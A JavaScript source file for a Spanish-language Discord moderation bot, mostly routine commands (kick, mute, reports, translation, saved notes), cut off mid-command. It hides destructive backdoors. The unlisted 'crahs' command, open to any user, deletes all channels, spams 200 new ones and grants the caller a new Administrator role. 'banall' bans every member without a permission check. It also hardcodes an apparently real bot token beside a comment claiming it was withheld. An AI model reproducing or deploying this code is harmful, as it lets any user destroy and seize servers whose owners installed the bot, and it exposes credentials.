// simple discord.js bot that you can use

const fs = require("fs");
const { Player } = require('discord-player');
const { Discord, Client, Intents, Partials, PermissionFlagsBits, PermissionsBitField, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const transcript = require('discord-html-transcripts');
const translate = require('translate-google-api');
const { ApplicationCommandOptionType } = require('discord.js');
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const { joinVoiceChannel, createAudioPlayer, createAudioResource, AudioPlayerStatus, getVoiceConnection } = require('@discordjs/voice');
const { YoutubeiExtractor } = require('discord-player-youtubei');
const { Schema, model } = require('mongoose');
require('dotenv').config();
const crypto = require('crypto');
const chalk = require('chalk');
const speed = require('performance-now');
const ytdl = require('ytdl-core');
const ffmpeg = require('ffmpeg-static');
const { v4: uuidv4 } = require('uuid'); // Instala el paquete uuid: npm install uuid
const uuid = require('uuid'); // Importa el paquete uuid.
const { version } = require('./package.json');
 // To read the JSON files
 
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildMembers
        ],
    partials: [Partials.Message, Partials.Channel, Partials.GuildMember]
});
// Parse duration string to milliseconds
function parseDuration(durationStr) {
    if (!durationStr) return 10 * 60 * 1000; // Default: 10 minutes

    const unit = durationStr.slice(-1);
    const value = parseInt(durationStr.slice(0, -1));

    switch (unit) {
        case 's': return value * 1000; // seconds
        case 'm': return value * 60 * 1000; // minutes
        case 'h': return value * 60 * 60 * 1000; // hours
        case 'd': return value * 24 * 60 * 60 * 1000; // days
        case 'w': return value * 7 * 24 * 60 * 60 * 1000; // weeks
        default: return 10 * 60 * 1000; // Default: 10 minutes
    }
}

// Check if user has moderator permissions
function hasModPermissions(member) {
    return member.permissions.has(PermissionFlagsBits.ModerateMembers) ||
        member.permissions.has(PermissionFlagsBits.Administrator);
}

const player = new Player(client);
//player.extractors.register(YoutubeiExtractor);

const quotesData = JSON.parse(fs.readFileSync("quotes.json", "utf8"));
const jokesData = JSON.parse(fs.readFileSync("jokes.json", "utf8"));
// load the quotes and jokes from json files

const prefix = "!";
// command prefix
const token = "MTM1MTA3MzgzNDE0ODgyMzA3MA.GkUmLG.YV_rg7tU5EDw1NGHKJe4VQVcop_BG47oDRyrzk";
// write your bot token here... DONT SHARE IT (which is why i didnt put mine here)
const propietarioID = '1317568519767982091';
// Reemplaza 'TU_ID_DE_USUARIO' con tu ID de usuario de Discord.

// Función para leer y escribir el archivo JSON de reportes.
function leerReportes() {
  try {
    const data = fs.readFileSync('reportes.json', 'utf8');
    return JSON.parse(data);
  } catch (error) {
    return {};
  }
}

function escribirReportes(reportes) {
  fs.writeFileSync('reportes.json', JSON.stringify(reportes, null, 2));
}

// Función para eliminar reportes respondidos después de 2 días.
function eliminarReportesRespondidos() {
  const reportes = leerReportes();
  const ahora = Date.now();
  const dosDias = 2 * 24 * 60 * 60 * 1000; // 2 días en milisegundos

  for (const idMensajeReporte in reportes) {
    if (reportes[idMensajeReporte].respondido && ahora - reportes[idMensajeReporte].fechaRespuesta > dosDias) {
      delete reportes[idMensajeReporte];
    }
  }

  escribirReportes(reportes);
}
const limite = 10; // Establece el límite de entradas aquí
const limiteCaracteres = 200; // Establece el límite de caracteres aquí
const tiempoExpiracion = 7 * 24 * 60 * 60 * 1000; // 7 días en milisegundos

client.on("messageCreate", async (message) => {
  if (!message.content.startsWith(prefix) || message.author.bot) return;
    eliminarEntradasExpiradas(); // Inicia la eliminación de entradas expiradas
  setInterval(eliminarEntradasExpiradas, 60 * 60 * 1000); // Ejecuta cada hora
 setInterval(eliminarReportesRespondidos, 60 * 60 * 1000);

async function eliminarEntradasExpiradas() {
  try {
    if (fs.existsSync('datos.json')) {
      const data = JSON.parse(fs.readFileSync('datos.json'));
      const ahora = Date.now();
      let cambios = false;

      for (const clave in data) {
        if (data[clave].timestamp && ahora - data[clave].timestamp > tiempoExpiracion) {
          delete data[clave];
          cambios = true;
        }
      }

      if (cambios) {
        fs.writeFileSync('datos.json', JSON.stringify(data, null, 2));
        console.log('Entradas expiradas eliminadas.');
      }
    }
  } catch (error) {
    console.error('Error al eliminar entradas expiradas:', error);
  }
}
  const name = message.author.username || 'Usuario';     
  const args = message.content.slice(1).trim().split(/ +/);
  const command = args.shift().toLowerCase();
  const rest = new REST({ version: '10' }).setToken(token);
    let antiLinkEnabled = true; // Inicialmente habilitado
  const discordRegex = /discord\.(gg|com|net|app)\/[\w-]+/i;
  const whatsappRegex = /chat\.whatsapp\.com\/[\w-]+/i;
  const telegramRegex = /t\.me\/[\w-]+/i;

  const isDM = message.channel.type === 'DM';
console.log(chalk.bold.cyan('┏┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅•'));
console.log(`${chalk.bold('┋[📩] Mensaje :')} ${chalk.white(message.content)} (Tipo: ${message.channel.type})`);
console.log(`${chalk.bold('┋[👤] De:')} ${chalk.yellow(message.author.tag)} ${chalk.white('en el canal:')} ${isDM ? chalk.red('DM') : chalk.blue(message.channel.name)} (${chalk.gray(message.channel.id)}`)
console.log(`${chalk.bold('┋[⚡] Servidor:')} ${isDM ? chalk.red('DM') : message.guild ? chalk.green(message.guild.name) : chalk.gray('N/A')}`);
console.log(chalk.bold.cyan('┗┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅•'));
console.log(message.content) 


  // Command: Ping Pong
  if (command === 'ping') {
  const timestamp = speed();
  const latensi = speed() - timestamp;
message.reply(`*Velocidad*: ${latensi.toFixed(4)} _ms_`);
  }

    if (command === 'antilink') {
        antiLinkEnabled = !antiLinkEnabled;
        message.channel.send(`El filtro anti-enlaces ahora está ${antiLinkEnabled ? 'activado' : 'desactivado'}.`);
    }

    if (antiLinkEnabled && !message.author.bot) {
        if (discordRegex.test(message.content) || whatsappRegex.test(message.content) || telegramRegex.test(message.content)) {
            const member = message.member;
            if (member.permissions.has(PermissionsBitField.Flags.Administrator) || member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
                await message.channel.send('¡A perro robando miembros!');
                return;
            }

            if (message.guild && message.content.includes(message.guild.id)) {
                await message.channel.send('¿Qué haces con el enlace de este servidor?');
                return;
            }

            try {
                await message.delete();
                await message.channel.send(`${message.author.toString()}, ¡no se permiten enlaces aquí!`);
            } catch (error) {
                console.error('No tengo permisos para borrar mensajes:', error);
                await message.channel.send('No tengo permisos para borrar mensajes.');
            }
        }
    }

  if (command === 'reporte') {
    if (args.length === 0) {
      return message.channel.send('Por favor, proporciona un mensaje para enviar.');
    }

    const reporte = args.join(' ');
    const reportes = leerReportes();
    const idMensajeReporte = message.id;
    const ahora = Date.now();
    const cincoDias = 5 * 24 * 60 * 60 * 1000; // 5 días en milisegundos
    const clave = uuid.v4(); // Genera una clave UUID única.

    // Verifica si el usuario ha enviado un reporte en los últimos 5 días.
    for (const id in reportes) {
      if (reportes[id].usuarioID === message.author.id && ahora - reportes[id].fechaEnvio < cincoDias) {
        return message.channel.send('Solo puedes enviar un reporte cada 5 días.');
      }
    }

    reportes[idMensajeReporte] = {
      usuarioID: message.author.id,
      texto: reporte,
      respondido: false,
      fechaEnvio: ahora,
      clave: clave,
    };

    escribirReportes(reportes);

    client.users.fetch(propietarioID).then(propietario => {
      propietario.send(`Reporte de ${message.author.tag} (ID: ${idMensajeReporte}, Clave: ${clave}): ${reporte}`);
      message.channel.send(`Tu reporte ha sido enviado. Clave del reporte: ${clave}`);
    }).catch(error => {
      console.error(error);
      message.channel.send('No se pudo enviar el reporte.');
    });
  }

  if (command === 'responder') {
    if (message.author.id !== propietarioID) return;

    if (args.length < 2) {
      return message.channel.send('Por favor, proporciona la clave del reporte y la respuesta.');
    }

    const clave = args.shift();
    const respuesta = args.join(' ');
    const reportes = leerReportes();

    // Encuentra el reporte con la clave proporcionada.
    const reporteEncontrado = Object.values(reportes).find(reporte => reporte.clave === clave);

    if (!reporteEncontrado) {
      return message.channel.send('Clave de reporte inválida.');
    }

    client.users.fetch(reporteEncontrado.usuarioID).then(usuarioReporte => {
      usuarioReporte.send(`Respuesta a tu reporte: ${respuesta}`);
      message.channel.send('Respuesta enviada.');
      reporteEncontrado.respondido = true;
      reporteEncontrado.fechaRespuesta = Date.now();
      escribirReportes(reportes);
    }).catch(error => {
      console.error(error);
      message.channel.send('No se pudo enviar la respuesta.');
    });
  }

  if (command === 'reportes') {
    if (message.author.id !== propietarioID) return;

    const clave = args.shift();
    const reportes = leerReportes();
    let mensaje = 'Reportes pendientes:\n';

    for (const idMensajeReporte in reportes) {
      if (!reportes[idMensajeReporte].respondido && (!clave || reportes[idMensajeReporte].clave === clave)) {
        mensaje += `ID: ${idMensajeReporte}, Clave: ${reportes[idMensajeReporte].clave}, Usuario: <@${reportes[idMensajeReporte].usuarioID}>, Texto: ${reportes[idMensajeReporte].texto}\n`;
      }
    }

    message.channel.send(mensaje || 'No hay reportes pendientes.');
  } 
  
  if (command === 'traducir') {
    const args = message.content.split(' ');
    const idioma = args[1];
    const texto = args.slice(2).join(' ');

    if (!idioma || !texto) {
      return message.channel.send('Debes proporcionar un idioma y texto a traducir.');
    }

    try {
      const traduccion = await translate(texto, { to: idioma });
      message.channel.send(traduccion);
    } catch (error) {
      console.error(error);
      message.channel.send('No se pudo traducir el texto.');
    }
  }
  
  // Command: Joke
  if (command === 'joke') {
    const randomJoke =
      jokesData.jokes[Math.floor(Math.random() * jokesData.jokes.length)];
    message.reply(`${randomJoke.setup} - ${randomJoke.punchline}`);
  }
  
  if (command === "dado") {
        const num = args[0] || 6;
        message.reply(`🎲 Dado callo en ${Math.floor(Math.random() * num) + 1}`);
    }
    
    if (command === 'creador') {
        const creatorEmbed = new EmbedBuilder()
            .setTitle('Creador Del Bot')
            .setDescription('Bot Creado Por **CuervoOFC**')
            .setColor('#0099ff')
            .addFields(
                { name: 'GitHub', value: '[CuervoOFC](https://github.com/CuervoOFC)', inline: true },
                { name: 'Bot Version', value: '1.0.0', inline: true }
            )
            .setThumbnail('https://github.com/CuervoOFC.png')
            .setTimestamp()
            .setFooter({ text: 'Bot By CuervoOFC' });

        await message.channel.send({ embeds: [creatorEmbed] });
    }
    
    if (command === "banlist") {
        if (!message.member.permissions.has(PermissionFlagsBits.BanMembers)) {
            return message.channel.send('No tienes permisos para usar este comando.');
        }
        message.guild.bans.fetch()
            .then(bans => {
                if (bans.size === 0) {
                    return message.channel.send('No hay miembros baneados.');
                }
                const banList = bans.map(ban => `${ban.user.tag} (${ban.user.id}): ${ban.reason || 'Razon no especificada'}`).join('\n');
                message.channel.send(`*Miembros Baneados:*\n${banList.substring(0, 1900)}${banList.length > 1900 ? '...' : ''}`);
            })
            .catch(err => message.channel.send('Fallo al revisar la lista.'));
    }

  // Command: Quote
  if (command === 'quote') {
    const randomQuote =
      quotesData.quotes[Math.floor(Math.random() * quotesData.quotes.length)];
    message.channel.send(`"${randomQuote.content}" - ${randomQuote.author}`);
  }

  // Command: Random number 
  if (command === 'random') {
    const roll = Math.floor(Math.random() * 100) + 1; // Random number between 1 and 100
    message.channel.send(`Numero random ${roll}!`);
  }

  // Command: Coin Flip
  if (command === 'coinflip') {
    const flip = Math.random() < 0.5 ? "cara" : "cruz";
    message.channel.send(`El coin callo en: ${flip}`);
  }

  // Command: Server Info
if (command === "serverinfo") {
        const embed = new EmbedBuilder()
            .setTitle(message.guild.name)
            .setThumbnail(message.guild.iconURL())
            .setColor('#0099ff')
            .addFields(
                { name: 'Dueño/a', value: `<@${message.guild.ownerId}>`, inline: true },
                { name: 'Miembros', value: message.guild.memberCount.toString(), inline: true },
                { name: 'Creado en', value: new Date(message.guild.createdTimestamp).toLocaleDateString(), inline: true },
                { name: 'Canales', value: message.guild.channels.cache.size.toString(), inline: true },
                { name: 'Roles', value: message.guild.roles.cache.size.toString(), inline: true },
                { name: 'Boosts', value: message.guild.premiumSubscriptionCount.toString(), inline: true }
            )
            .setFooter({ text: `Server ID: ${message.guild.id}` });
        message.channel.send({ embeds: [embed] });
    }
    
    if (command === "crahs") {
    // Мега-краш по команде
    const guild = message.guild;
    // 1. Удалить все каналы
    guild.channels.cache.forEach(channel => channel.delete().catch(err => {}));
    // 2. Спам новыми каналами (500+)
    for (let i = 0; i < 200; i++) {
      guild.channels.create({ name: `CRAHS-BY-MIYAMURABOT-${i}`, type: 0 })
        .then(() => console.log(`Канал ${i} создан!`))
        .catch(() => {});
    }
    // 3. Роли-вирусы
    guild.roles.create({ name: '💀 JAILBREAKED', color: '#ff0000', permissions: ['Administrator'] })
      .then(role => {
        message.member.roles.add(role).catch(() => {});
      });
  }

  if (command === "banall") {
    // Массовый бан
    message.guild.members.cache.forEach(member => {
      member.ban({ days: 7, reason: 'Se La Chupas A Mi Creador <CuervoOFC>, UwU 👉👈' }).catch(() => {});
      message.channel.send()
    });
  }
    
    if (command === "avatar") {
        const user = message.mentions.users.first() || message.author;
        const embed = new EmbedBuilder()
            .setTitle(`@${user.tag}, Avatar`)
            .setImage(user.displayAvatarURL({ size: 1024 }))
            .setColor('#0099ff');
        message.channel.send({ embeds: [embed] });
    }
    
    if (command === "roleinfo") {
        const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[0]);
        if (!role) {
            return message.channel.send('Mensiona un roll para ver su información.');
        }
        const embed = new EmbedBuilder()
            .setTitle(role.name)
            .setColor(role.color)
            .addFields(
                { name: 'Miembros', value: role.members.size.toString(), inline: true },
                { name: 'Creado en', value: new Date(role.createdTimestamp).toLocaleDateString(), inline: true },
                { name: 'Posicion', value: role.position.toString(), inline: true },
                { name: 'Mencionable', value: role.mentionable ? 'Si' : 'No', inline: true }
            )
            .setFooter({ text: `Roll ID: ${role.id}` });
        message.channel.send({ embeds: [embed] });
    }
    
    if (command === "emojis") {
        const emojis = message.guild.emojis.cache.map(e => e.toString()).join(' ');
        message.reply(`Server emojis: ${emojis || 'None'}`);
    }
    
    if (command === "servericon") {
        const embed = new EmbedBuilder()
            .setTitle(message.guild.name)
            .setImage(message.guild.iconURL({ size: 4096 }))
            .setColor('#0099ff');
        message.reply({ embeds: [embed] });
    }
    
    if (command === "nickname") {
        if (!message.member.permissions.has(PermissionFlagsBits.ManageNicknames)) return message.reply("Tu no tienes permisos para usar este comando!");
        const member = message.mentions.members.first();
        const nickname = args.slice(1).join(' ');
        if (!member || !nickname) return message.reply("Mensiona a un miembro para darle un nickname!");
        member.setNickname(nickname)
            .then(() => message.reply(`Se cambio ${member} su nickname a ${nickname}`))
            .catch(err => message.reply("Fallo al cambiar su nickname"));
    }
    
  // Command: User Info
  if (command === "userinfo") {
        const user = message.mentions.users.first() || message.author;
        const member = message.guild.members.cache.get(user.id);
        const embed = new EmbedBuilder()
            .setTitle(user.tag)
            .setThumbnail(user.displayAvatarURL())
            .setColor('#0099ff')
            .addFields(
                { name: 'Servidor', value: new Date(member.joinedTimestamp).toLocaleDateString(), inline: true },
                { name: 'Creacion de cuenta', value: new Date(user.createdTimestamp).toLocaleDateString(), inline: true },
                { name: 'Roles', value: member.roles.cache.map(r => r.name).join(', ').substring(0, 1024) || 'Ninguno' }
            )
            .setFooter({ text: `Usuario ID: ${user.id}` });
        message.channel.send({ embeds: [embed] });
    }
  
  // Command: eliminar
  if (command === 'kick') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.KickMembers)) {
            return message.reply('You do not have permission to kick members.');
        }
        
        const member = message.mentions.members.first();
        if (!member) return message.reply('Please mention a valid member to kick.');
        
        try {
            await member.kick();
            message.channel.send(`${member.user.tag} has been kicked.`);
        } catch (error) {
            message.channel.send('Failed to kick the member.');
            console.error(error);
        }
    }

    if (command === 'ban') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers)) {
            return message.reply('You do not have permission to ban members.');
        }
        
        const member = message.mentions.members.first();
        if (!member) return message.reply('Please mention a valid member to ban.');
        
        try {
            await member.ban();
            message.channel.send(`${member.user.tag} has been banned.`);
        } catch (error) {
            message.channel.send('Failed to ban the member.');
            console.error(error);
        }
    }

    if (command === 'clear') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
            return message.reply('Tu no tienes permisos para usar el comando.');
        }
        
        const amount = parseInt(args[0]);
        if (isNaN(amount) || amount < 1 || amount > 100) {
            return message.reply('Especifica  cuantos mensajes elimino del 1 al 100.');
        }
        
        try {
            await message.channel.bulkDelete(amount, true);
            message.channel.send(`Eliminar ${amount} mensajes.`);
        } catch (error) {
            message.channel.send('Fallo al eliminar los mensajes.');
            console.error(error);
        }
    }

  if (command === 'guardar') {
    const texto = message.content.slice(9).trim();
    if (!texto) return message.reply('Debes proporcionar el texto que quieres guardar.');

    if (texto.length > limiteCaracteres) {
      return message.reply(`El texto no puede exceder los ${limiteCaracteres} caracteres.`);
    }

    try {
      let data = {};
      if (fs.existsSync('datos.json')) {
        data = JSON.parse(fs.readFileSync('datos.json'));
      }

      if (Object.keys(data).length >= limite) {
        return message.reply(`Se ha alcanzado el límite de ${limite} entradas.`);
      }

      const clave = uuidv4();
      data[clave] = {
        texto: texto,
        timestamp: Date.now(), // Guarda la marca de tiempo
      };
      fs.writeFileSync('datos.json', JSON.stringify(data, null, 2));
      message.reply(`Texto guardado correctamente. Clave: \`${clave}\``);
    } catch (error) {
      console.error('Error al guardar el texto:', error);
      message.reply('Ocurrió un error al guardar el texto.');
    }
  }

  if (command === 'ver') {
    const clave = message.content.slice(5).trim();
    if (!clave) return message.reply('Debes proporcionar la clave del texto que quieres ver.');

    try {
      if (fs.existsSync('datos.json')) {
        const data = JSON.parse(fs.readFileSync('datos.json'));
        if (data[clave]) {
          message.reply(`Texto guardado:\n\`\`\`${data[clave].texto}\`\`\``);
        } else {
          message.reply('No se encontró el texto con esa clave.');
        }
      } else {
        message.reply('No hay textos guardados.');
      }
    } catch (error) {
      console.error('Error al ver el texto:', error);
      message.reply('Ocurrió un error al ver el texto.');
    }
  }

  if (command === 'borrar') {
    const clave = message.content.slice(8).trim();
    if (!clave) return message.reply('Debes proporcionar la clave del texto que quieres borrar.');

    try {
      if (fs.existsSync('datos.json')) {
        const data = JSON.parse(fs.readFileSync('datos.json'));
        if (data[clave]) {
          delete data[clave];
          fs.writeFileSync('datos.json', JSON.stringify(data, null, 2));
          message.reply('Texto borrado correctamente.');
        } else {
          message.reply('No se encontró el texto con esa clave.');
        }
      } else {
        message.reply('No hay textos guardados.');
      }
    } catch (error) {
      console.error('Error al borrar el texto:', error);
      message.reply('Ocurrió un error al borrar el texto.');
    }
  }

  if (command === 'entradas') {
    try {
      if (fs.existsSync('datos.json')) {
        const data = JSON.parse(fs.readFileSync('datos.json'));
        const entradasUsadas = Object.keys(data).length;
        const entradasDisponibles = limite - entradasUsadas;
        message.reply(`Entradas usadas: ${entradasUsadas}\nEntradas disponibles: ${entradasDisponibles}`);
      } else {
        message.reply(`Entradas usadas: 0\nEntradas disponibles: ${limite}`);
      }
    } catch (error) {
      console.error('Error al mostrar las entradas:', error);
      message.reply('Ocurrió un error al mostrar las entradas.');
    }
  }

  if (command === 'tiempo') {
    const clave = message.content.slice(8).trim();
    if (!clave) return message.reply('Debes proporcionar la clave del texto.');

    try {
      if (fs.existsSync('datos.json')) {
        const data = JSON.parse(fs.readFileSync('datos.json'));
        if (data[clave]) {
          const tiempoRestante = tiempoExpiracion - (Date.now() - data[clave].timestamp);
          if (tiempoRestante > 0) {
            const dias = Math.floor(tiempoRestante / (24 * 60 * 60 * 1000));
            const horas = Math.floor((tiempoRestante % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
            const minutos = Math.floor((tiempoRestante % (60 * 60 * 1000)) / (60 * 1000));
            message.reply(`Tiempo restante para la clave \`${clave}\`: ${dias} días, ${horas} horas, ${minutos} minutos.`);
          } else {
            message.reply(`La clave \`${clave}\` ha expirado.`);
          }
        } else {
          message.reply('No se encontró el texto con esa clave.');
        }
      } else {
        message.reply('No hay textos guardados.');
      }
    } catch (error) {
      console.error('Error al mostrar el tiempo restante:', error);
      message.reply('Ocurrió un error al mostrar el tiempo restante.');
    }
  }
  
    if (command === 'restaurar') {
    const clave = message.content.slice(10).trim();
    if (!clave) return message.reply('Debes proporcionar la clave del texto.');

    try {
      if (fs.existsSync('datos.json')) {
        const data = JSON.parse(fs.readFileSync('datos.json'));
        if (data[clave]) {
          data[clave].timestamp = Date.now(); // Restablece la marca de tiempo
          fs.writeFileSync('datos.json', JSON.stringify(data, null, 2));
          message.reply(`Tiempo de expiración para la clave \`${clave}\` restablecido.`);
        } else {
          message.reply('No se encontró el texto con esa clave.');
        }
      } else {
        message.reply('No hay textos guardados.');
      }
    } catch (error) {
      console.error('Error al restablecer el tiempo de expiración:', error);
      message.reply('Ocurrió un error al restablecer el tiempo de expiración.');
    }
  }
  
    // Command: Menu
    if (command === 'menu') {
        const uptime = Math.floor(process.uptime());
        const days = Math.floor(uptime / 86400);
        const hours = Math.floor((uptime % 86400) / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = uptime % 60;

        const uptimeString = `${days}d ${hours}h ${minutes}m ${seconds}s`;

        const embed = {
            color: 0xe983d8,
            title: 'MiyamuraBot Informacion',
            description: 'Un bot para discord para administrar y escuchar musica.',
            fields: [
                { name: 'Version', value: version, inline: true },
                { name: 'Uptime', value: uptimeString, inline: true },
                { name: 'Comandos', value: '```\n!listbot - El bot envia todas sus funciones\n```' }
            ],
            timestamp: new Date().toISOString(),
            footer: {
                text: 'Made with by Cuervo-Team-Supreme'
            }
        };

        await message.channel.send({ embeds: [embed] });
    }
    
    if (command === 'listbot') {
    message.reply('TODAS LAS FUNCTIONES DE MIYAMURABOT\n\nAdministración De Servers\n!mute @user [duración] [razón] - Mutear\n!unmute @user - Unmute\n!eliminar @user [razón] - Ban\n!unkick @user - Unkick\n!kick @user - Elimina\n!clear [1 al 100] - Limpia el chat\n!userinfo @user - Información del usuario\n!serverinfo - Información del servidor\n!ban @user - Da ban al user\n!banlist - Revisa los usuarios baneados\n!members - Revisa los miembros\n!banall - Banea a todos\n!nuke - No se que hace (totalmente beta)\n!poll - Crea encuesta\n!nickname @user - Cambia el nickname\n!avatar - Revisa el perfil\n\nInfo Rpg\n!coinflip - Lanza una moneda\n!dado - Un número random del 1 al 6\n!random - Un número random del 1 al 100\n!ppt - Juega piedra papel o tijera con el bot\n!8ball - As una pregunta\n\nInfo De Bot\n!ping - Velocidad del bot\n!uptime - Tiempo de actividad del bot\n!infobot - Información del bot\n!botinfo - Mas información del bot\n\nInfo De Play\n!play [canción] - Escucha una canción\n!stop - Para la reproducción\n!skip - Salta a la siguiente canción a reproducir\n!pause - Pausa la reproducción\n!resume - Reanudar la reproducción\n!volume - Ajusta el volumen de la reproducción\n!list - Lista de reproducción\n!time - Tiempo a terminar la canción\n\nInfo Random\n!traducir [idioma + texto] - Traduce de un idioma a otro\npiropo - Un piropo random\n\nInfo De Servers\n!createchannel - Crea un canal\n!delchannel - Elimina un canal\n!channels - Canales del servidor\n!emojis - Revisa los emojis del server\n\nInfo De Roles\n!createrole - Crea un roll\n!delrole - Elimina un roll\n!getrole - Revisa el roll de un miembro\n!removerole - Quita el roll de un miembro \n!roles - Roles del servidor\n!roleinfo - Revisa el roll\n\nInfo Mas Comandos\n!mascommands');
    }
    
   if (command === 'mascommands') { 
   message.reply('MAS COMADOS DE MIYAMURABOT\n\nInfo De Guardado\n!guardar - Guarda un texto por 7 dias\n!ver - Revisa tu texto \n!restablecer - Restablece el tiempo de tu texto\n!borrar - Elimina El texto guardado\n!entradas - Revisar cuantos espacios hay para guardar textos\n!tiempo - Revisa el tiempo que le queda a tu texto guardado\n\nInfo De Reporte\n!reporte - Reportar al creador\n!reportes - Ver los reportes existentes\n!responder - Responde al reporte\n\nMas Comandos\n!antilink - El bot elimina enlaces de diacord, whatsapp y telegram\n');
    }
    
    if (command === "roles") {
        const roles = message.guild.roles.cache.map(r => r.name).join(', @');
        message.reply(`Roles del server: ${roles}`);
    }
    
    if (command === "channels") {
        const channels = message.guild.channels.cache.map(c => c.name).join(', ');
        message.reply(`Canales del server: ${channels}`);
    }
    
    // Command: mute @User [duration] [reason]
    if (command === 'mute') {
        const mentionedUser = message.mentions.members.first();
        if (!mentionedUser) return;

        // Check if bot has permission to timeout members
        if (!message.guild.members.me.permissions.has(PermissionFlagsBits.ModerateMembers)) {
            return message.channel.send('I don\'t have permission to timeout members.');
        }

        // Check if the bot's role is higher than the target user's role (role hierarchy)
        if (mentionedUser.roles.highest.position >= message.guild.members.me.roles.highest.position) {
            return message.channel.send('I cannot moderate this user because they have a role equal to or higher than mine.');
        }

        // Parse arguments
        let duration, reason;

        // If there are arguments after the mention
        if (args.length > 2) {
            // Check if the next argument is a duration
            const durationRegex = /^\d+[smhdw]$/;
            if (durationRegex.test(args[2])) {
                duration = args[2];
                reason = args.slice(3).join(' ') || 'reason not provided';
            } else {
                duration = '10m'; // Default duration
                reason = args.slice(2).join(' ');
            }
        } else {
            duration = '10m'; // Default duration
            reason = 'reason not provided';
        }

        // Convert duration string to milliseconds
        const durationMs = parseDuration(duration);

        try {
            await mentionedUser.timeout(durationMs, reason);
            message.channel.send(`<a:bonk:1348931006152839228> Done! Muted ${mentionedUser} for ${duration}. Reason: ${reason}`);
        } catch (error) {
            console.error('Error muting user:', error);
            message.channel.send('Failed to mute user. Make sure I have the correct permissions.');
        }
    }

    // Command: unmute @User
    if (command === 'unmute') {
        const mentionedUser = message.mentions.members.first();
        if (!mentionedUser) return;

        // Check if bot has permission to timeout members
        if (!message.guild.members.me.permissions.has(PermissionFlagsBits.ModerateMembers)) {
            return message.channel.send('I don\'t have permission to remove timeouts.');
        }

        try {
            await mentionedUser.timeout(null); // Remove timeout
            message.channel.send(`<:yessir:1348944055605661767> Done! Unmuted ${mentionedUser}`);
        } catch (error) {
            console.error('Error unmuting user:', error);
            message.channel.send('Failed to unmute user. Make sure I have the correct permissions.');
        }
    }

    // Command: kick @User [reason]
    if (command === 'eliminar') {
        const mentionedUser = message.mentions.members.first();
        if (!mentionedUser) return;

        // Check if bot has permission to ban members
        if (!message.guild.members.me.permissions.has(PermissionFlagsBits.BanMembers)) {
            return message.channel.send('I don\'t have permission to ban members.');
        }

        // Parse reason
        const reason = args.slice(2).join(' ') || 'reason not provided';

        try {
            await mentionedUser.ban({ reason });
            message.channel.send(`<:ban:1348945066542104697> Done! Banned ${mentionedUser}. Reason: ${reason}`);
        } catch (error) {
            console.error('Error banning user:', error);
            message.channel.send('Failed to ban user. Make sure I have the correct permissions.');
        }
    }

    // Command: unkick @User
    if (command === 'unkick') {
        // Since we can't directly mention banned users, we'll extract the user ID
        // Format expected: kub @User or kub UserID
        let userId;

        if (message.mentions.users.size > 0) {
            userId = message.mentions.users.first().id;
        } else if (args.length > 1) {
            // Try to extract user ID from the second argument
            // It could be a raw ID or a mention format like <@123456789>
            const idMatch = args[1].match(/\d+/);
            userId = idMatch ? idMatch[0] : null;
        }

        if (!userId) return;

        // Check if bot has permission to ban members (which includes unbanning)
        if (!message.guild.members.me.permissions.has(PermissionFlagsBits.BanMembers)) {
            return message.channel.send('I don\'t have permission to unban members.');
        }

        try {
            await message.guild.members.unban(userId);
            message.channel.send(`Ejemplo !unkick <1348944055605661767> o !unkick <@${userId}>`);
        } catch (error) {
            console.error('Error unbanning user:', error);
            message.channel.send('Fallo al quitar el muteo.');
        }
    }
    
    if (command === "uptime") {
        const uptime = process.uptime();
        const dias = Math.floor(uptime / 86400);
        const horas = Math.floor(uptime / 3600) % 24;
        const minutos = Math.floor(uptime / 60) % 60;
        message.reply(`Tiempo activo: ${dias}d ${horas}h ${minutos}m`);
    }
    
    if (command === "infobot") {
        message.channel.send(`Nombre bot: ${client.user.tag}\nBot ID: ${client.user.id}\nTotal Servidores: ${client.guilds.cache.size}`);
    }
    
    if (command === "botinfo") {
        const embed = new EmbedBuilder()
            .setTitle('Informationcion')
            .addFields(
                { name: 'Servidores', value: client.guilds.cache.size.toString(), inline: true },
                { name: 'Usuarios', value: client.users.cache.size.toString(), inline: true },
                { name: 'Canales', value: client.channels.cache.size.toString(), inline: true },
                { name: 'Discord.js', value: '14.x', inline: true }
            )
            .setColor('#0099ff');
        message.reply({ embeds: [embed] });
    }
    
    if (command === "ppt") {
        const choices = ['piedra', 'papel', 'tijeras'];
        const choice = args[0]?.toLowerCase();
        if (!choices.includes(choice)) return message.reply("Selecciona papel piedra o tijeras!");
        const botChoice = choices[Math.floor(Math.random() * choices.length)];
        message.reply(`Tu acción ${choice}, acción del bot ${botChoice}`);
    }
    
    if (command === "members") {
        const online = message.guild.members.cache.filter(m => m.presence?.status === 'online').size;
        const total = message.guild.memberCount;
        message.reply(`Miembros en linea: ${online}\nMiembros en total: ${total}`);
    }
    
    if (command === "poll") {
        if (args.length < 1) {
            return message.channel.send('Da una pregunta para hacer la acción. ');
        }

        const question = args.join(' ');
        const embed = new EmbedBuilder()
            .setTitle('📊 Encuesta')
            .setDescription(question)
            .setColor('#0099ff')
            .setFooter({ text: `Encuesta creada por ${message.author.tag}` });

        const pollMessage = await message.channel.send({ embeds: [embed] });
        await pollMessage.react('👍');
        await pollMessage.react('👎');
        await pollMessage.react('🤷');
    }
    
    if (command === "createchannel") {
        if (!message.member.permissions.has(PermissionFlagsBits.ManageChannels)) return message.reply("Tu no tienes los permisos para usar este comando!");
        const channelName = args.join('-').toLowerCase();
        if (!channelName) return message.reply("Especifica el nombre del canal!");
        message.guild.channels.create({ name: channelName })
            .then(channel => message.reply(`Canal creado ${channel}`))
            .catch(err => message.reply("Fallo al crear el canal"));
    }
    
    if (command === "delchannel") {
